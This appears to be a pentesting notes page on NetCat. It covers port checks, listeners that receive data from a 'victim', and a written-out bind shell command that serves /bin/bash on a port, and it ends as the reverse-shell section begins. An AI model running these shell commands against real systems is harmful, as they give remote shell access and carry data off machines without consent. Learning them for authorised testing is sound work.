---
description: >-
  An insight into how to use NetCat for pentesting. Use these commands if you
  get code execution on the victim's machine anywhere.
---

# NetCat

## Introduction:

* NetCat is a super lightweight, widely-available tool used for port scanning, file transfers, reverse shells and communication across a network.&#x20;
* It can use TCP or UDP connections both and creates a pipeline (like a water hose, intuitively) between 2 machines.&#x20;

***

## Checking Port Availability:

You can check if a port is open on a machine using this command:

```shellscript
root@kali:~# nc -zv [Target] [Port to test]    
```

-> "-z": prevents nc from sending/receiving any data. It simply attempts a TCP connection (or UDP with the -u flag) to the port to see if it's open.

-> "-v": verbose mode. Make the output wordy so it's easier to understand what's going on.&#x20;

***

## Starting a Listener (On Attacker's Machine):

This is useful for the victim to connect to the attacker's machine for stuff like file share etc.

```shellscript
root@kali:~# nc -l 4444 > receivedinfo.txt
```

-> "-l": starts a listener on the specified port. Ports above 1024 don't require special privileges to use so are ideal.&#x20;

-> Stores whatever the machine hears on port 4444 from the victim into a text file called receivedinfo.txt

***

## Sending a Message (From Attacker's Machine):

This is useful for sending across files or string messages.&#x20;

```shellscript
root@kali:~# echo "hello" | nc [Target] [Port]
root@kali:~# cat message.txt | nc [Target] [Port]
```

-> Works as long as the target is listening on the port.

-> Pipes "hello" as a string to be transferred over to the target.

***

## Bind Shell:

As a reminder, this is when the victim opens a port and waits for the attacker to bind. Attacker initiates connection.&#x20;

Victim machine:

```shellscript
root@kali:~# nc -l -p [Port] -e /bin/bash
```

Attacker's machine:

```shellscript
root@kali:~# nc [Target] [Port]
```

***

## Reverse Shell:

As a reminder, this is when the victim connects back to the attacker, giving the attacker a shell. Victim initiates connection. More firewall friendly (Bind Shell may be blocked as it's an incoming request).&#x20;
